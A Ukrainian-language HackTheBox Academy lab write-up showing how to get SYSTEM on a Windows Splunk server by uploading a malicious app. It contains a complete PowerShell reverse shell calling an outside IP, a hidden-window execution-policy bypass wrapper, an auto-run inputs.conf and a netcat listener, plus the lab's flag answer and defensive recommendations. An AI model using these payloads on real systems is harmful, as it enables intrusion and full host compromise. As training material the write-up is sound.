# Attacking Common Applications — Attacking Splunk

Модуль: [Attacking Common Applications](https://academy.hackthebox.com/app/module/113)
Урок: [Attacking Splunk](https://academy.hackthebox.com/app/module/113/section/1213)
Ціль: `10.129.201.50` (Windows Server, APP03)

Відповідь Q1 (`c:\loot\flag.txt`): `l00k_ma_no_AutH!`

## Концепція

Splunk дозволяє встановлювати кастомні застосунки через веб-інтерфейс, а формат застосунку (`inputs.conf` + скрипт у `bin/`) підтримує автоматичний запуск довільного скрипта (Python, Bash, PowerShell) одразу після інсталяції — це штатна функція для збору логів, яка стає RCE-вектором, якщо зловмисник має доступ до Splunk Web з правами на встановлення застосунків. Оскільки ціль — Windows-сервер, використовуємо PowerShell reverse shell, обгорнутий у `.bat`-файл, бо Splunk input запускає скрипти через системний виконуваний файл (`.bat`/`.sh`), а не напряму `.ps1`.

## Крок 1 — Створення структури застосунку (термінал, атакуюча машина)

```bash
mkdir -p splunk_shell/bin splunk_shell/default
```

Пояснення: Splunk App вимагає строгу структуру директорій — `bin/` для виконуваних скриптів, `default/` для конфігураційних файлів (`inputs.conf`), без цього Splunk не розпізнає застосунок як валідний.

## Крок 2 — Створення PowerShell reverse shell (термінал)

```bash
cat > splunk_shell/bin/run.ps1 << 'EOF'
$client = New-Object System.Net.Sockets.TCPClient('10.10.15.168',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
EOF
```

Важливо: IP у `New-Object System.Net.Sockets.TCPClient(...)` має бути IP вашої атакуючої машини (Pwnbox/VPN-IP), а не цілі — саме сюди прилетить connect-back з'єднання.

## Крок 3 — Створення обгортки .bat (термінал)

```bash
cat > splunk_shell/bin/run.bat << 'EOF'
@ECHO OFF
PowerShell.exe -exec bypass -w hidden -Command "& '%~dpn0.ps1'"
Exit
EOF
```

Пояснення: `-exec bypass` обходить PowerShell Execution Policy, `-w hidden` приховує вікно консолі, `%~dpn0.ps1` динамічно резолвиться в шлях до `run.ps1` у тій же директорії (тобто `.bat` і `.ps1` мають лежати поруч і мати однакове ім'я файлу без розширення).

## Крок 4 — Створення inputs.conf (термінал)

```bash
cat > splunk_shell/default/inputs.conf << 'EOF'
[script://.\bin\run.bat]
disabled = 0
sourcetype = shell
interval = 10
EOF
```

Пояснення: `disabled = 0` активує input одразу при встановленні застосунку, `interval = 10` каже Splunk перезапускати скрипт кожні 10 секунд (це поле обов'язкове, без нього input не запуститься взагалі).

## Крок 5 — Упаковка застосунку в tarball (термінал)

```bash
tar -cvzf updater.tar.gz splunk_shell/
```

Результат:
```
splunk_shell/
splunk_shell/bin/
splunk_shell/bin/run.bat
splunk_shell/bin/run.ps1
splunk_shell/default/
splunk_shell/default/inputs.conf
```

## Крок 6 — Запуск listener (термінал, ОБОВ'ЯЗКОВО до кроку 8)

```bash
sudo nc -lnvp 443
```

Важливо: listener має слухати на тому ж порту (443), який вказаний у `run.ps1`, і має бути запущений ДО завантаження застосунку — реверс-шел спрацює автоматично одразу після інсталяції, без додаткового підтвердження.

## Крок 7 — Логін у Splunk Web (браузер)

Відкрити: `https://10.129.201.50:8000/en-US/account/login`

Авторизуватись валідними кредами адміністратора Splunk.

## Крок 8 — Завантаження шкідливого застосунку (браузер)

Перейти на сторінку установки застосунку:
```
https://10.129.201.50:8000/en-US/manager/appinstall/_upload
```

Дії:
1. Натиснути **Browse**, вибрати `updater.tar.gz`
2. Натиснути **Upload**

Пояснення: одразу після завантаження Splunk автоматично розпаковує архів у `$SPLUNK_HOME/etc/apps/`, читає `inputs.conf` та активує input, бо `disabled = 0` — це запускає `run.bat` → `run.ps1` → з'єднання назад на listener.

## Крок 9 — Отримання шела (термінал, у вікні з netcat)

```
PS C:\Windows\system32> whoami
nt authority\system
PS C:\Windows\system32> hostname
APP03
```

Пояснення: `nt authority\system` — це найвищий рівень привілеїв у Windows, оскільки Splunk на Windows зазвичай запускається як служба під системним акаунтом; це типовий результат для цього вектора атаки на Windows-хостах.

## Крок 10 — Читання прапора (термінал, у вікні з reverse shell)

```
PS C:\Windows\system32> type C:\loot\flag.txt
l00k_ma_no_AutH!
```

**Q1 = `l00k_ma_no_AutH!`**

## Чому це працює (root cause)

- **Опис:** Функція встановлення кастомних Splunk-застосунків через веб-інтерфейс, у поєднанні з підтримкою автоматичного запуску скриптів через `inputs.conf`, дозволяє будь-якому автентифікованому адміністратору Splunk виконати довільний код на рівні ОС (CWE-94, Code Injection через штатну функціональність).
- **Технічні деталі:** Splunk не перевіряє вміст скриптів у `bin/` на шкідливість — це не CVE, а навмисна дизайн-особливість, потрібна легітимним data collection apps; коли акаунт з правами `admin` скомпрометований (слабкий пароль, фішинг, чи інший вектор), ця функція стає прямим шляхом до RCE.
- **Ризик/Імпакт:** Отримання shell з правами `NT AUTHORITY\SYSTEM` — найвищий рівень доступу у Windows, що дає повний контроль над хостом, доступ до LSASS-пам'яті для дампу credentials, і потенційний pivot на весь домен через Universal Forwarders (якщо Splunk-хост є deployment server).
- **Рекомендації:** Обмежити права на встановлення застосунків лише довіреним адміністраторам, вимкнути можливість завантаження застосунків через Web UI у продакшн-середовищах (`allowRemoteLogin`, ACL на `/manager/appinstall`), моніторити нові/змінені файли в `$SPLUNK_HOME/etc/apps/` через FIM (File Integrity Monitoring), використовувати мережеву сегментацію для обмеження вихідних з'єднань зі Splunk-хостів.

## Додатково — Lateral movement через Deployment Server

Якщо скомпрометований Splunk-хост є deployment server, застосунок можна розповсюдити на всі хости з Universal Forwarder, розмістивши його в `$SPLUNK_HOME/etc/deployment-apps` на скомпрометованому хості — у Windows-середовищі це знову вимагає PowerShell-варіант (не Python), бо Universal Forwarder не постачається з вбудованим Python, на відміну від повного Splunk Server.
